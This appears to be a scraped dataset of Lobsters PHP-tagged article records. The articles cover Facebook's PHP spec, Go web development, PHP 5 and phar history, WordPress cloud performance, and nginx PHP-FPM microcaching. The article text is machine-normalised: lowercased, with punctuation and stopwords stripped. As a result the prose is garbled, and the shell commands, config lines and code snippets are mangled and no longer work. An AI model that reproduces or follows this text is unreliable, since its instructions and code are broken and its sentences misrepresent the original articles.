immutablejs iwankgb hardly believe eye php get formal specification last health fitness developer oversee language including engineer facebook assembling document detail php work set stage building additional facebook share opensource project breaking authority news busy week facebook opensource front social network announced release language specification php well sharing three javascript project flux immutablejs joel marcey paul thank much well thought piece php spec super glad found spec generally high quality knew would perfect ok u really want community effort moving forward make spec awesome provided jumping point make happen sd time news digest july io source code official php spec custom android fork project ara hiphop virtual machine technical writer joel marcey announced released php spec blog post along php core developer sara golemon announcement initial draft specification facebook share opensource project socianews online busy week facebook opensource front social network announced release language specification php well sharing three javascript project flux immutablejs php specification surely joking facebook hihid news specification aim fix php quirk problem announcing draft facebook joel marcey described php one popular programming php domain parser add support programme php community recently announced release initial draft specification php important step development open formal semantics php presented ecoop facebook php spec daniele filaretti attending conference heard news release facebook new php specification process reading comparing work write facebook share opensource project cloudbackupcheapcom week facebook opensource front social network announced release language specification php well sharing three javascript project flux immutablejs gixtools php get formal specification last developer oversee language including engineer facebook assembling document detail php work set stage building additional php finalmente le specifiche edit il blog di htmlit hhvmajaxurl http bloghtmlitwpadminadminajaxphp var tag noalert var el nuevo php con esto hace sólo algunos días tuvimos la interesante noticia de que el equipo de hhvm publicó un primer borrador para una especificación de lenguaje para php lo que cobra especial relevancia mike grice lingua franca internet bgp facebook share opensource project dudeliziouscom busy week facebook opensource front social network announced release language specification php well sharing three javascript project flux immutablejs nitesh khandelwal really great news php specification u php one popular language world around past year php always missing language specification de julho de um dia emocionante para todos o programadores php echo olamundophp originalmente em de julho de por joel nadir awesome news someone glad see company weight fb others react move php spec dream come true php information blog supposed longterm dream case dream come true sara golemon excellent facebook team made draft php spec paint php spec cjhaascom know late game good
247,Lobsters,php,PHP programming,Parsing PHP in Go,https://stephensearles.com/?p=288,parsing php go,caddy hugo predecessor danandstephennet caddy source post javascript framework word framework library meaningful useful info new gopher go tour spec effective go http golangorgpkgnethttp http golangorgpkgio http golangorgpkgfmt http golangorgpkgbytes http http http filippoiowhygoiselegantandmakesmycodeelegant http bloggolangorgslices http http http http jmoironnetblogcrossingstreamsalovelettertoioreader see rob pike talk writing lexer little tool github muxchain written muxchain muxchainutil dave cheney installing godoc http searching http stephensearlescomparkandride github github http stephensearlescomchromewebkitbugs example api author bug one reward tool bisectbuilds code search google code hosting chromium open bug bunch resource tyler lighttpd diaspora anthony greenwald http iatstephensearlescomadmin source code jeditundo selectwithotherjeditable,thu sep working plugin caddy hook hugo tailored interface predecessor code wrote bit chose blog originally meant danandstephennet going elaborate little thought process went roughly like requirement easy partner manage edit mean need guiweb friendly wysiwyg feel authoring need support picture r basic blogging feature reasonably secure bank blog anything least obviously vulnerable like light breeze low power want run cheap virtual server nice written go making extra cheap also easy hack around okay choice available blogger medium proprietary selfhosted fine choice people without custom option think better wordpress huge difficult secure road plenty let use drupal etc huge unfamiliar still static far understand cost run sound like issue modest scale jekyll ghost etc static getting world developer focused system gui question hugo static site generator written go enjoyed using would nice even plugin interface caddy unfortunately plugin interface provide nicety wysiwyg experience basically wrapper around file manager could replace thought process brought far figured give shot link hugo web wysiwygish markdown editor contained new caddy plugin good fit need either think plugin bridge caddy goal simple webserver technical nontechnical people alike publish web reduces friction getting accessible cm feature modern automatic http server month thousand mile later partner able use host farm adventure blog project coming along nicely got far author overview page collaborative editing delta syncing via websocket draft presentation alongside edit screen image upload serving onthefly resizing comment optionally guarded lowsecurity password definitely bug going keep working source already available anyone else want try hack watch mon oct upfront going point horse race experience bitten gnarly expensive code one many time said post recently trying sus difference two one pithy phrase going around framework call code call library tempting paint bright line truth though term ambiguous used describe varying thing past apple us framework describe various api group eg corelocationframework videotoolboxframework c programmer using library decade describe c equivalent package term standard library seems mean lot library part language distribution wikipedia list jquery google web toolkit next javascript framework probably similar mercury thermometer water lake superior sure code thing web one write almost exclusively java give dom ajax tool past opportunity succinct definition word related issue probably read write word often post deriding framework favor library often read post framework library current state field afraid come following conclusion word framework library meaningful encompass distinct codebase use project avoid work duplication simplify problem perhaps say different shade meaning perhaps like term web scale objectoriented cloud specific enough write better either avoid qualify want leave hanging said stake let take another look idea people describe smacktalk framework however critique valid something called library think common code dependency like dislike answer question hide detail underlying action way make difficult uncover hide detail underlying data way make difficult compose functionality similarly purposed framework library lead difficult understand stack trace require substantial amount specific code including configuration subclass useful require force program structure type pattern mesh fluidly reduce safety code make code difficult reason limit ability provide feature using pattern support encourage code conflict race great consider combined penalty yes answer question ask much gaining library another framework could reasonable alternative kind question use think quality project rather framework library word say nothing fact project writing let use word like following describe project answer yes question expensive illfitting lossy opaque rough encumbering hightouch gnarly captive code answer thrifty frugal tailored concise transparent precise straightforward honest agreeable detachable idea looking forward reading wellworded review critique sun aug useful info new gopher couple folk question getting started go going outline favorite link people get familiar language fine idiom first stop go tour take roughly five hour remarkably complete introduction structure language critical document spec well written easily read plain english highly recommend bookmarking spec goto reference rule low high max slicing spec effective go one earlier document describe well established idiom language package look package often used also best example standard library power recommend reviewing knowing well http golangorgpkgnethttp http golangorgpkgio http golangorgpkgfmt http golangorgpkgbytes post good tip http http http filippoiowhygoiselegantandmakesmycodeelegant post indepth discussion help better internalize go feature http bloggolangorgslices http http http http jmoironnetblogcrossingstreamsalovelettertoioreader sun aug page revise time time see sun jul lot php problem plaguing language well documented many company project frightfully entrenched recently project aimed improving performance reliability thing like hack phpng recent effort toward language specification unfortunately none project directly result improving large existing body php learned go watched rob pike talk writing texttemplate lexer thought would fun try language idea reading php past several month whim evolved nearly featurecomplete php parser goal milestone related project nebulous best began crazy experiment currently par code throw support php feature thus important goal point move parser solidly support full set php feature stretch would great possible set parser check specific php version project currently test coverage coverage full unit test like increase number also like improve stability parsing incorrect code point think opportune moment consider next direction take parser beyond parsing list idea phpfmt tool la gofmt static analysis tool eg type inference dead code detection transpiler transpiler perhaps favorite idea particularly go goast package transpiling go perhaps closest reach goal despite sounding lofty said project began experiment time continues one happy open project wider audience please feel free comment contribute would like play parser little tool testing code available github fri may tl dr martini make go magic whole point go simple magic wrong direction language ecosystem try something like muxchain instead sorry codegangsta really tried write post without calling martini point coming across martini gained tremendous amount attention short time think might even gotten people give go try think use several reason martini defeat go type system martini us dependency injection determine handler pas request get response back martini allows pas anything dependency injector call handler take look code func main martiniclassic mget bad func fmtprintln anything happen mrun going revisit example later compiles run almost expect gotcha though would never want appropriately nethttp would never allow misstep providing handler way writing response another example func main martiniclassic mget myhandler myhandler mrun var myhandler print work answer sort compiles indicate work however soon run panic since typical use case set handler initialization might become significant pain point actually specifying handler real problem dependency injection package part martini abusing reflection defeat compiletime type system use matter time bite moreover type system huge reason choosing go want maybe try python twisted martini defeat one go best pattern uniformity discoverability streaming data say new go image like serve web perfectly valid code seems like reasonable naive approach func main martiniclassic mget kitten func interface f osopen kittenjpg return f mrun get browser osfile value wrong try func main martiniclassic mget kitten func interface f osopen kittenjpg defer fclose imagedecode f return mrun get invalid value dig martini reflect fully understand happens suffices say happens return interface type handler martini conceivable someone would write handler returning empty interface done sometimes return correct type martini rare case return something invalid sound like potential production issue make martini risk try finally got func main martiniclassic mget kitten func interface f osopen kittenjpg defer fclose b ioutilreadall f return b mrun work finally got image careful reader notice terribly wrong antipattern avoided image read memory returned took approach say large movie file well might actually run memory first request others written go inheritance unix philosophy martini make deceptively easy throw baby bathwater yes yes pas httphandler martini always still lose uniformity handler see point type discoverability ioreader iowriter beauty show mean handler would written func main muxchainutilnewmethodmux get kitten func w httpresponsewriter req httprequest f osopen kittenjpg defer fclose iocopy w f httplistenandserve way io work us small amount memory buffer image network ioreader iowriter used throughout standard library beyond end able seamlessly tie together thing like image encryption html template http wonderful probably one biggest unsung hero go however http probably commonly used case discovered awesome let hide let definitely break martini broken package main import fmt githubcomgomartinimartini func main martiniclassic mget func string return hello world mget bad func fmtprintln anything happen mrun bad route print stdout log status code response actually return unclear response default nethttp functionality response inconsistent ok given code import io nethttp githubcomgomartinimartini func main martiniclassic mget helloworld func w httpresponsewriter req httprequest iowritestring w requrlpath mrun would expect happen browse helloworld yes right ok helloworld one work figured martini interpreting regular expression inherent flaw martini go package passing martini string might regular expression might regular expression valid url path potential conflict conclusion post really martini singled package keep seeing everywhere keep asking understand provides great deal convenience magic come even greater cost one could see future many package repeat mistake pollute ecosystem lead difficulty finding package compound bug like pointed good direction u take go wonderful thing though need wanted prove wrote muxchain package muxchainutil provided nearly every feature martini provides magic everything literally nethttp reflection give try tell think new might need work sure naming could use improvement codegangsta credit credit due one thing totally got right martini suggestion please let know sat dec recently found instruction dave cheney installing godoc launch agent o x really cool go documentation running locally system ensure always running realized get display package well insanely helpful documentation autogenerated package consistent nice documentation standard library requires slight tweak dave file adding gopath environment variable toward bottom xml version encoding doctype plist public appledtd plist http plist version dict key label key string orggolanggodoc string key programarguments key array ensure absolute path godoc install string usrlocalgobingodoc string string string array key socket key dict key listener key dict key sockservicename key string string dict dict key keepalive key true key environmentvariables key dict key gopath key ensure absolute gopath string usersstephencodego string dict dict plist simply install librarylaunchagentsorggolanggodocplist run launchctl load librarylaunchagentsorggolanggodocplist navigate http see code alongside standard library searching want enable search small tweak file add line http flag string index string also play adding indexthrottle flag want use le cpu finish quicker found index created never get updated refresh search index kill godoc process launchd restart mon dec put bit time park ride map app past week pushed latest update tonight try http stephensearlescomparkandride stylistic change see added way specify park ride stop found app proving useful many search finding great data transit location update first step toward fixing next step use google place api add location database exciting feature api look forward improvement usergenerated data offer application like mine feel free peruse code contribute project github sun nov released park ride direction week ago work progress definitely work case improvement plan make data source google place api every station listed would like modify app allow user enter park ride station get direction using new station also added place database every time person us one place get place bump algorithm decide check park ride station always return great result think place api using query guide rather limit return result could test returned result display subset think would helpful would also neat find plain driving direction public transit direction alert user one would actually faster driving though one benefit park ride usually parking station easier parking final destination definitely interesting work hope revisit project soon source available github interested contributing sun apr thinking managing big project like chrome depends big project like webkit ton chrome bug actually webkit bug related webkit bug somehow much like one encountered previous post google code project hosting seem great way manage external bug dependency google code yet took upon write tool help chromium developer find relationship chromium bug webkit bug bit python javascript planning releasing source code soon result already online http stephensearlescomchromewebkitbugs bit explored rather astonishing finding first look like virtually case open chrome bug webkit relationship updated commented upon recently webkit bug blame chromium developer likely fixing many webkit bug rather pleasant observation problem occur chrome developer seem generally fix source instead writing ugly workaround one possibility another observation many open chromium bug related webkit bug almost half one pseudorandomly looked simply left open webkit bug fixed sometimes year least one required work webkit bug fixed presumably many many talking statistic hold bug could closed right last time chromium bug tracker good day speaking chromium bug tracker take close look scraped data sort last updated project find chrome marked recently updated webkit bug happen well two thing two potential issue google code first little issue google code display comment wrap tag google code seems display html source pretty common talking browser linkifies url however make error url wrapped case seen example happening query parameter could regular expression error something anchor element inside pre element second google code bug nebulous look roughly bug webkit bug referenced list many actually webkit bug referenced surprised get list using google search query exactly bugswebkitorgshowbugcgi though using api curious google search returning seems false positive looking closer bug referenced usually bug tracker showbugcgi link using slash word boundary searching two section independently something could likely address clever searching data processing also wonder literal search option made obvious know anyone work google code thing look hope help someone working chromium give shout find particularly useful idea expanding thinking thing like autocommenting bot may intrusive r feed love hear thought seems like many simple thing could fixed least kept tab better bit information tue mar recently became author chromium fixed minor bug one sort overshadowed larger one get back specific like first say fun experience chromium definitely largest project ever contributed mostly avoided learning process getting acclimated huge code base thing needlessly feared yes thing learn yes finding location bug code like sailing buried treasure map name island treasure hunt come satisfaction reward would say difficult part getting involved mechanic managing source huge take better part hour download git repository first compile take long one thereafter nothing scoff especially accustomed browserrefresh build time web development said pretty neat tool chromium developer manage impressed bisectbuilds think git bisect git serve revision try like attentive waiter serf course like git proper chooses revision help narrow one introducing bug also seamlessly manages downloading preparing built version chromium background even need wait many case need good sommelier plugin abstract review commit process spooked could imagine snippy programmer getting curly brace wrong spot saying right thing commit message yes style important especially big project yes style guide err toward ridiculous something serious worry end anything would likely get trouble even reason process place key patience project like chromium ton developer employed work project tend helpful know process daunting newcomer newcomer one point probably made mistake care tell actual code biggest impression organization lot made sense everything go src webkit go thirdparty htmlselectelement go html great system place pretty much completely useless bug grappled click event firing select element mac traipsed directory directory breaking thing get stack trace anything could leave semblance breadcrumb trail biggest epitaph ever could code search google note much code search functionality available google code hosting including search chromium got use left working bug large project similar task must horrendous think company tasked organizing world information would see vital organize information use organize information yo bug take look find interesting example way crossplatform application interact specific platform mac user ever notice little menu pop select box program even program mainly written native cocoa still call provide nativeappearing interface complexity result hiccup like onmouseup event firing select element time mouse button released cursor longer purview select nsmenu offered o problem solved firing fake event tricking select thinking click finished fix never made regular webkit source used chromium quite figured patch yet commit make fixed related issue chrome flag page presumably place seeing problem see plan keep working bug dear reader write patch power open bug time get cracking really lot fun need help getting started bunch resource helpful chromium team definitely feel free shout best give hand help find someone wed jan git incredibly handy moving work around different machine reasonable thing consider actually deploying website server done different way simple recipe accomplishing task step assume already ssh server know web root server outside web root mkdir myrepogit cd myrepogit git init bare local machine git remote add myserver myusername serverhostname pathtomyrepogit git push myserver master name remote whatever want server hostname need use ssh server way setting unless ssh certificate already installed process ask password every time attempt push something server back server web root location want website deployed git clone pathtomyrepogit make live repository autoupdate need modify hookspostreceive file bare repository may need rename postreceivesample contain cd absolutepathtomylivedir env git pull ffonly origin master env git submodule sync env git submodule update recursive reason last two command submodules remain sync checked deployed repository might also need change permission file already correct chmod postreceive set need push new commits live server git push myserver master interested happening pushing repository server bare repository contains git object version file repository however upon receipt new commits push regular repository web root reason essentially proxy repository without overriding protective setting git disallows updating nonbare remote repository refusing update checked branch refsheadsmaster default updating current branch nonbare repository denied make index work tree inconsistent pushed require git reset match work tree head setting proxy allows keep setting intact told git allow fastforward update resolve potential merge conflict live repository accept change pretty simple stay ahead make commits directly live repository always reconcile bare repository attempting push related topic planned post use similar strategy version synchronize database schema definitely complicated somewhat riskier process one deserves attention soon sun jan recently switched chrome celebration tyler joining chrome team google really great omnibox perhaps one best feature experience box leave thing lacking user often visit website bookmark save later reference expect able find browser history seems pretty standard thought omnibox helpful process sure could search use one history bookmark suggestion pop sometimes really want get quick search within scope thing history bookmark perhaps ease search engine keyword fun fact take little digging chrome setting say want able type h javascript search history anything javascript simply go search engine setting chrome settingssearchengines add history h keyword following url chrome history q bookmark chrome bookmark q perfect noticeable option perhaps default setting sure people would love obvious sat jan protest around sopa one tweet prompted thought overarching role technology motivation behind statement reflects systemic misunderstanding internet role dramatically changing society seems either refusal adapt ignorance need academic exercise tweet describes respect become irrelevant skill find information well researched topic becomes trivial wikipedia google search index grow task lamy think teaching student original research contribute one thousand stub article wikipedia improve existing article lack bibliographic support simply cut modern tool student deliver education parent got prepare world parent inherited one practical situation tool available teach research skill independent meaningless field beyond education solution technology retool stifle serve something people tolerate long tue oct recently mostly finished transition new server came free web host pretty good significant limitation mainly php also limited software provided vps struggled bit getting set much better someone getting started kind project anew piece advice use o package installer ssh sftp great minimally convenient come installing lot software consider every little thing end needing server even come curl installed easy way get little thing vital sanity consider software planning use mistake yet pay type using lighttpd webserver like deploy instance diaspora likely going need switch back apache conventional server issue lighttpd allow server http http nothing certainly would like part http known thing ahead time could prevented duplicating lot work hand suppose thing must trial error unless read every little detail beforehand set significant block time get server andor make switching domain name one last thing installation various thing ie wordpress website visited would display confidential information problem suggestion hiccup difficult avoid new sysadmin minimizing time visibility issue significantly mitigate problem later come step step deploy part site using git conventional knowledge seem work might either mon aug long finally working version webiat online originally developed cool folk ucla anderson school management geoff ho margaret shih graciously agreed open source work continue working software manages run implicit association test experiment pioneered anthony greenwald determine person association different paired category could many thing commonly positivenegative class people potentially facing discrimination like blackwhite employedunemployed version early alpha running http iatstephensearlescomadmin current login available publicly username test password test change soon data site could wiped continue develop put anything counting let know think play site like tinker source code mon aug start blog would like take moment outline expectation plan thought start website came need place publish code demo online done registered domain already bit code bigger question though website represent sure main thrust behind host code time use express ability write code always hesitant past start something like blog worried held word publish online feared likelihood nobody really much interest say blog component could much simpler website despite concern voice use really exciting privilege write word website step emerging global conversation internet term social medium platform within domain anyone else important point era facebook possible brink paradigm shift toward google plus need remember internet website already take back reclaim public open virtual space hold particular topic blog post telling code critical thinking prominent like note code already jeditundo selectwithotherjeditable plugins editinplace jquery extension developed much bigger project like talk soon
248,Lobsters,php,PHP programming,Celebrating 10 Years of PHP 5.0.0,https://blog.engineyard.com/2014/php-5-10th-anniversary,celebrating year php,couple php alpha password hashing api ruby rail cakephp zend framework symfony lithium laravel significant change php last year feel php impacted web never cal evans think cloud impacting php however pressing issue php michelle sanver would like see next major version chris cornutt timeline zend engine public preview php beta php beta php beta php release candidate php release candidate php beta php release candidate php final released php released php branch created phpinternals php released php alpha php released rip unicode decision move php php released php released php release candidate php next generation phpng future php phpnext php v php future php,ten year ago yesterday july php unleashed onto world bringing zend engine effectively brand new php zend engine actually made first public appearance couple php alpha testing u big immediate difference object passed reference something new object model whatever truth php php mostly procedural language supported class object bolton feature history still visible majority default feature set even today including newest addition like new password hashing api even got real although would argue better object model community really know framework catchy name put piece together really started realize php brought table framework ruby rail course opinion ruby rail significant thing happen php ever often case php community first mimicked cakephp built zend framework symfony later lithium laravel dozen successful others much almost building mvc pattern rail brought table ten year long time come long way since initial release php part research reached number community member asked thought significant change php last year feel namespaces others php object model change little doubt community changed intervening year feel php impacted web ease use ability act glue php installed web server use web site mean every site visit using php capacity impact web undeniable even cool trendy language let face never cool still tool choice many u getting thing seems lot different outcome last ten year thing changed maturity community response question ranged better awareness equality problem development use best practice many pointed current socalled rennaisance composer posterchild twitter impacted level communication php community anything else including facebook php community talk twitter cal evans think cloud impacting php surprisingly question mostly answered little php always sharednothing mean language scale infinitely horizontally making perfect cloud however soon started write code us shared resource includes simple thing like using builtin file based session thing start get tricky php impacted cloud bit piece glue together definitely community focus energy scaling session memcache replication mysql postgresql switching away relational database entirely pressing issue php exception definite desire bringing consistency php core needlehaystack haystackneedle inconsistency one thing people always point proof php bad language whole community acknowledges make language bad something would like change also many wish say goodbye bad legacy decision favor new functionality looking forward new major version sooner rather later think php still way go term fixing consistency finally say starting look like well rounded object oriented language well done year happy birthday community awesome like usually say hug michelle sanver would like see next major version surprisingly performance hot topic next major version however rise hhvm project performance everybodies mind lately besides greater focus builtin security anonymous object asynchronous function type hinting generic desired lot great idea think reboot security language emphasis coming year developer start learning secure application lot specific way work several best practice established around securing database query protecting output filtering input definitely could made simpler chris cornutt timeline timeline put together initial release zend engine latest release php zend engine public preview zend engine made first appearance preview three alpha based php may september php beta october php beta june php beta december php release candidate march php release candidate june php beta february php release candidate april php final released july php brought many enhancement new object model spl iterators reflection class autoloading completely redone xml support including simplexml mysqli extension improved mysql support sqlite support improvement stream php released november php branch created august post phpinternals mailing list version chosen new development intended bring unicode support core language php released november php alpha august three year working php unicode php move forward series php released june php effectively php without unicode work bringing major feature php release date rip php unicode march discussion go heat decision move php contains unicode work made favor continuing series php released march php release finally removed registerglobals along number legacy option much short array syntax trait enhancement closure short echo tag always available builtin web server php released june php continues cadence delayed month addition zend opcache replaces apc amid number larger change generator coroutines finally added trycatch simple password hashing api php php soon available currently release candidate smallest release since series resumed variadic function argument unpacking aka splat constant scalar expression php next generation phpng may zend announces work refactoring zend engine called phpng result significant performance increase however requires update existing extension still work complete futureof php beyond phpnext backwards compatibility breaking rfcs proposed naturally next major version php people mind php v php everything worked supposed php would released year ago following php unicode support throughout would allowed u thing like use chinese cyrillic alphabet identifier well ensuring string function actually operated character byte etc thing go plan decision made eventually release majority feature scheduled everything unicode transition php time came move php unicode effort dropped entirely php followed future php php always hand community shape future web looking forward php idea phpnext bring table love hear thought feedback comment
250,Lobsters,php,PHP programming,"WordPress in the Cloud: Part 4, Performance",https://blog.engineyard.com/2014/wordpress-in-the-cloud-part-4,wordpress cloud part performance,basic install install theme install plugins legacy application dealing filesystem freezing state filesystem external data storage cattle instead pet new relic new relic standard plan pro plan new relic addon page engine yard dashboard new relic addon page new relic documentation cloudflare cloudflare cloudflare wordpress plugin shave yak freezing filesystem state shave yak engine yard dashboard back track engine yard dashboard cloudflare cloudflare account page conclusion next post series,previous post series covered get basic install wordpress running cloud install theme install plugins biggest hurdle deploying legacy application cloud dealing filesystem fortunately freezing state filesystem deploy work around adapting code write external data storage remove runtime dependency file system technique covered far work great sort cloud environment fully managed cloud like engine yard private cloud run premise key detail server virtualised treating like cattle instead pet able benefit fault tolerance high availability flexible scaling often enough also need think way improve performance going explore world addons thirdparty service new relic want improve performance important understand exactly site performing hard optimise something measuring new relic provides detailed analytics allow monitor troubleshoot fine tune application performance real time agent run app instance monitor cpu memory network utilisation data sent back new relic powerful visualisation report allow understand fortunately engine yard provides new relic via addon meaning get set matter second standard plan provided free engine yard account trial pro plan also available visit new relic addon page log click set continue following along series already app deployed engine yard see screen like go ahead click activate continue done visit engine yard dashboard navigate app click apply button apply pending configuration change activate new relic agent wait configuration applied good measure visit blog click around page generates bit sample data something look new relic wait minute go back new relic addon page select new relic dashboard righthand navigation new relic dashboard see app listed front centre click name taken app dashboard look little something like overview app performance metric feel free click around read new relic documentation want get feel available come back new relic next post series benchmarking cloudflare next look caching may heard caching important wordpress want run highperformance site lot option available need careful caching done whether compatible cloud wp super cache instance us filesystem store cache file work certain extent mean application instance manage local cache suboptimal instead going use thirdparty service called cloudflare manage cache u cloudflare also provides number benefit distributed denialofservice ddos protection application security firewall request analytics network request optimisation ssl even come builtin content distribution network cdn speed thing endusers best starter plan completely free quick visual overview let start installing cloudflare wordpress plugin ensures wordpress configured optimally work cloudflare also mean whenever mark spam blog information fed back cloudflare getting best threat protection possible start dev server php wait might get error message wordpress telling upgrade entire installation happen whole install date case happens let take little diversion shave yak also give u perfect opportunity revisit method freezing filesystem state shave yak put current task hold switch upgrading wordpress wordpress side easy follow instruction like normal appear wordpress admin interface finished upgrading go console use git see changed git status branch master branch uptodate originmaster change staged commit use git addrm file update committed use git checkout file discard change working directory modified licensetxt modified readmehtml modified wpactivatephp wpincludesjstinymcetinymceminjs wpincludesjswpdialogjs wpincludesjswpdialogminjs change added commit use git add andor git commit check list changed file make sure happy add change git commit back repository git add git commit upgrade wordpress master upgrade wordpress file changed insertion deletion create mode wpadmincssaboutrtlcss create mode wpadmincssaboutcss create mode wpadmincssadminmenurtlcss create mode wpincludesjswpdialogminjs rewrite wpincludesjswplinkminjs rewrite wpincludesmssettingsphp git push visit engine yard dashboard navigate app select deploy redeploy code done visit production blog try log see something like worry entirely normal wordpress detected updated file database upgraded go ahead click update wordpress database presented screen telling everything worked congratulation upgraded wordpress cloud exact process used updating theme plugins back track okay fully uptodate wordpress install production local machine visit dev site log admin interface navigate plugins add new type cloudflare search box hit search locate cloudflare plugin select install confirmation screen pop select activate plugin done check local filesystem see changed add file git commit push back repository log engine yard dashboard navigate app select deploy redeploy code done visit production blog log select plugins find cloudflare plugin click activate activate production site done select cloudflare lefthand nav plugins point need create cloudflare account detail configure wordpress site already head cloudflare register account need set custom dns add website cloudflare allow add amazon web service aws url application master directly follow instruction screen told update domain using cloudflare name server key cloudflare work traffic routed cloudflare infrastructure passed application server necessary safe wait name server record update might take hour log back production wordpress admin configure cloudflare setting configure domain name configured cloudflare want able turn development mode also provide cloudflare api key api email available cloudflare account page everything worked see screen like congratulation working cloudflare configuration mean external traffic going hit cloudflare cache reach blog take significant amount load app improve site performance conclusion post used two thirdparty solution help u improve performance site set new relic allows u monitor real time performance data app giving u crucial insight app performing pressure preventative measure put app behind awesome accelerator cache next post series going take look exactly sort performance gain expect setup like benchmark site addition cloudflare use new relic get better look going behind scene used app performance tool production experience share anything else add wordpress setup cloud get maximal performance
251,Lobsters,php,PHP programming,PHP 5.3 5th Anniversary: The History of PHP Archives (PHAR Files),https://blog.engineyard.com/2014/php-53-5th-anniversary,php anniversary history php archive phar file,phparchive stream phpmyadmin started impossible archivetar phparchive phparchive phparchive voting,june mark anniversary php included phar extension first time initial commit phparchive dated jan nine year ago story phar file started month meaning passed anniversary experiment went impact entire php community set stage php current stable release php still month away php final rc released still several month away first ever release ubuntu linux warty warthog remember morning crazy idea singlearchive php application like java jar file php phar bet use brand new stream feature day deployment meant using ftp connect server transferring file remember frustrated long phpmyadmin took transfer many tiny file least according git took even longer one large file modem great could upload zip file unpack server shared host ssh something could expect back first phar created hand based premise knew tar file basically bunch nonprintable binary data separated file data original format meant put php code tar would still php code create tar file single php file opened vim see looked like tar cvf infotar infophp looked something like infophp binary data php phpinfo binary data amazingly ran basically worked php spat filename random gibberish result phpinfo filephp gibberish phpinfo php version obviously perfect pretty good start stop extraneous output start archive file renamed php would mean archive started open php tag tar file look like php binary data php phpinfo excitement ran result except instead filephp start output meant parsed reason worked forgot remove extraneous php file pretty obvious parsed php requires whitespace php opening tag rename file php space remove extraneous php content try tar file look like php binary phpinfo run error php warning unexpected character input infotar line warning unexpected character input infotar line php parse error syntax error unexpected tlnumber infotar line parse error syntax error unexpected tlnumber infotar line could get php ignore binary junk use comment need rename file time php add line whitespace top infophp start commented line much harder rename file include might think fact impossible next best edited tar file success first valid phar born point longer valid tar file something really wanted retain turned easy obvious fix use comment syntax renamed file php yielding tar file look like php binary phpinfo completely valid tar file also completely valid php script without unintended sideeffects point moved generating file archivetar package progressed bundling archivetar code inside phar selfcontained essentially led phparchive class would using archivetar handle stream part eventually would lead subclass like phparchivecreator creating phars etc got far went pear proposal pepr pepper stated phparchive phparchive provides similar functionality java jar file phparchive specially formatted valid tar file inclusion file done using requireonce phar filephp instead requireonce filephp phparchive phparchive allows distribute single file entire application phparchive lengthy unpacking time phparchive valid tar archive phparchive valid php script assuming packed code valid phparchive created nix tar command include special file use phardefaultphp start file application phparchive work php php phparchivecreator also allows specify different file phardefaultphp file run phparchivecreator ability compress file phparchive phparchive protect script file stored plaintext inside valid tar file anybody unpack see proposal entirety including voting happened month later long story phar created mostly hacking around tar command line still create tarbased php archive terribly different first handmade artisanal tar file thankfully long two folk much smarter greg beaver marcus börger took idea added zip support created phar format vastly superior turned c phar extension bundled enabled default since php
252,Lobsters,php,PHP programming,Creating a high performance WordPress VPS with Nginx + PHP-FPM + Microcaching,http://reviewsignal.com/blog/2014/06/25/40-million-hits-a-day-on-wordpress-using-a-10-vps/,creating high performance wordpress vps nginx phpfpm microcaching,managed wordpress hosting performance benchmark update wordpress hosting performance benchmark given reasonable vps sort performance get blitzio previous digital ocean available github lamp stack available github lamp stack pdf lamp phpfpm available github pdf nginx phpfpm aka lemp stack available github lempphpfpm pdf microcaching reverse proxy cache nginx fastcgicache rush generated successful hit second transferred mb data app average hit rate translates hitsday available github lempphpfpm microcaching pdf mircocaching config walkthrough default nginxconf go big go home rush generated successful hit second transferred mb data app average hit rate translates hitsday user blitz test pdf conclusion managed wordpress hosting performance benchmark web hosting review comparison table available github thanks credit million hit day wordpress using server small orange,recently tested many biggest name managed wordpress hosting article managed wordpress hosting performance benchmark update wordpress hosting performance benchmark preparing second round testing double number company board u like setup server cheap given reasonable vps sort performance get million hit measured blitzio benchmark beat based previous iteration question decided test ground let start basic configuration gradually try improve test performed ram digital ocean vps running ubuntu code documentation also available github lamp stack based previous experience benchmarking wordpress nt high hope test last time crashed mysql almost instantly time ran blitz lot slower user performance nt impressive started slowing almost immediately continued get worse surprise lamp stack setup script available github download full blitz result lamp stack pdf lamp next thing tried phpfpm fastcgi process manager got slightly better performance faster response time user graph look pretty similar seeing quickly increasing response time number user go great improvement lamp setup script available github download full blitz result pdf nginx phpfpm aka lemp stack maybe problem apache tried nginx next happened got worse performance default lamp stack wtf everyone said nginx faster turn magically faster apache appears worse box lemp phpfpm setup script available github download full blitz result lempphpfpm pdf microcaching written creating reverse proxy cache nginx already setup nginx web server nt need reverse proxy time nginx fastcgicache allows u cache result fastcgi process php applied technique result staggering response time dropped scaled concurrent user rush generated successful hit second transferred mb data app average hit rate translates hitsday error connection timeouts lemp phpfpm microcaching setup script available github download full blitz result lempphpfpm microcaching pdf mircocaching config walkthrough standard aptget update aptget install nginx sudo aptget install mysqlserver mysqlclient aptget install get u nginx mysql phpfpm next need tweak phpfpm setting using one liner edit uncomment change setting turning uncommenting listen ownergroupmode setting sed sed listenowner wwwdatalistenowner wwwdata sed listengroup wwwdatalistengroup wwwdata sed listenmode make sure create folder cache mkdir usrsharenginxcache need nginx configs etcnginxsitesavailabledefault config add server setting also make sure add indexphp index command set servername domain ip location php tryfiles uri fastcgisplitpathinfo php fastcgicache microcache fastcgicachekey scheme host requesturi requestmethod fastcgicachevalid fastcgicacheusestale updating error timeout invalidheader fastcgipassheader setcookie fastcgipassheader cookie fastcgiignoreheaders cachecontrol expires setcookie fastcgipass unix fastcgiindex indexphp include fastcgiparams move etcnginxnginxconf make change like increasing workerconnections also add line http including configs fastcgicachepath usrsharenginxcachefcgi creates fastcgicache done somewhat ugly oneliners script someone cleaner way please share cleaned provided full file comparison go big go home since nginx nt seem blink hit user wondered high would really go tried user guess rush generated successful hit second transferred mb data app average hit rate translates hitsday problem started getting error user rush experienced timeouts error amazingly peaked astonishing user per second watched process test running saw nginx worker fully maxing cpu test running think hit limit core vps handle setup champ though sure caused big spike perhaps cache refresh wanted roll wordpress vps serve lot static content template pretty good starting point download full result user blitz test pdf conclusion definitely lot improvement made config nt optimize anything nt hit cache dynamic content often logged user nt talk security nt lot thing nt comfortable editing php nginx linux configssettings running important website probably go managed wordpress company really need performance ca nt manage need look managed wordpress hosting performance benchmark want good web hosting company take look web hosting review comparison table code documentation available github thanks credit title inspired ewan leith post million hit day wordpress using server ewan built server handled userssecond without issue using varnish nginx phpapc total cache special thanks go small orange let test multiple iteration lemp stack especially ryan macdonald aso spent lot time talking wordpress performance following two tab change content kevin ohashi geekincharge review signal passionate making data meaningful consumer kevin based washington dc
